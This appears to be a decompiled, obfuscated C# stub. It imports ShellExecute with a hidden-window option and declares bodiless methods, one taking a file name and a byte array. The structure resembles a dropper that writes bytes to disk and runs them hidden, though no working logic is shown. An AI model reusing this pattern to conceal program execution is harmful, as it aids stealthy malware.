using System;
using System.Runtime.InteropServices;

internal static class _Trinity_Obfuscator_xMaf_Trinity_Obfuscator_
{
	public enum _Trinity_Obfuscator_fXub_Trinity_Obfuscator_
	{
		SW_HIDE = 0,
		SW_SHOWNORMAL = 1,
		SW_NORMAL = 1,
		SW_SHOWMINIMIZED = 2,
		SW_SHOWMAXIMIZED = 3,
		SW_MAXIMIZE = 3,
		SW_SHOWNOACTIVATE = 4,
		SW_SHOW = 5,
		SW_MINIMIZE = 6,
		SW_SHOWMINNOACTIVE = 7,
		SW_SHOWNA = 8,
		SW_RESTORE = 9,
		SW_SHOWDEFAULT = 10,
		SW_FORCEMINIMIZE = 11,
		SW_MAX = 11
	}

	[DllImport("shell32.dll")]
	private static extern IntPtr ShellExecute(IntPtr intptr_0, string string_0, string string_1, string string_2, string string_3, _Trinity_Obfuscator_fXub_Trinity_Obfuscator_ _Trinity_Obfuscator_fXub_Trinity_Obfuscator__0);

	private static extern void _Trinity_Obfuscator_Vczd_Trinity_Obfuscator_(string string_0, byte[] byte_0);

	[STAThread]
	private static extern void _Trinity_Obfuscator_oIdh_Trinity_Obfuscator_(string[] args);
}
